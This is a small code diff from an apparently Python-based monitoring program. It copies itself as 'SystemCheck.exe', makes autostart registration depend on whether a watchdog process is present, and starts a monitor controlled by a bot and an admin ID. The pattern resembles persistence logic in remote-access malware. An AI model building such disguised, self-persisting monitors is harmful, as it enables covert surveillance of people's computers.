@@ -2441,7 +2441,13 @@ if __name__ == "__main__":
         current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
         target_exe = os.path.join(target_dir, "SystemCheck.exe")
         
-        check_integrity(target_dir, target_exe, current_exe)
+        watchdog_present = os.path.exists(os.path.join(BASE_DIR, "watchdog.exe"))
+        check_integrity(
+            target_dir,
+            target_exe,
+            current_exe,
+            register_autostart=not watchdog_present,
+        )
         
         # Start monitor thread
         monitor = SystemMonitor(ADMIN_ID, bot, config)
